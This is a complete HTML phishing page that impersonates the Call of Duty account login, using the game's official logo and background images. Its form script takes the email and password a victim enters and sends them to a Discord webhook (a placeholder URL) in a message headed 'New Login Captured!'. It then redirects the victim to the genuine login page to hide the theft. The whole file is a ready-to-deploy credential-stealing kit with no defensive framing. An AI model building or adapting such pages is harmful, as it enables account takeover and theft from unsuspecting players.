<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call of Duty - Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            background-image: url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/kronos/common/bg-pattern.png');
            font-family: 'Arial', sans-serif;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: rgba(20, 20, 20, 0.9);
            padding: 40px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            max-width: 200px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #aaa;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background-color: #222;
            border: 1px solid #444;
            color: #fff;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #f9a826;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #f9a826;
            color: #000;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: background-color 0.3s;
        }
        .btn-login:hover {
            background-color: #e09622;
        }
        .footer-links {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
        }
        .footer-links a {
            color: #aaa;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer-links a:hover {
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/kronos/common/logo-cod.svg" alt="Call of Duty">
        </div>
        <h2>Account Login</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required placeholder="Enter your email">
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Password?</a>
            <a href="#">Create an Account</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
            const payload = {
                content: "**New Login Captured!**\n**Email:** " + email + "\n**Password:** " + password
            };
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                window.location.href = 'https://profile.callofduty.com/cod/login';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://profile.callofduty.com/cod/login';
            });
        });
    </script>
</body>
</html>
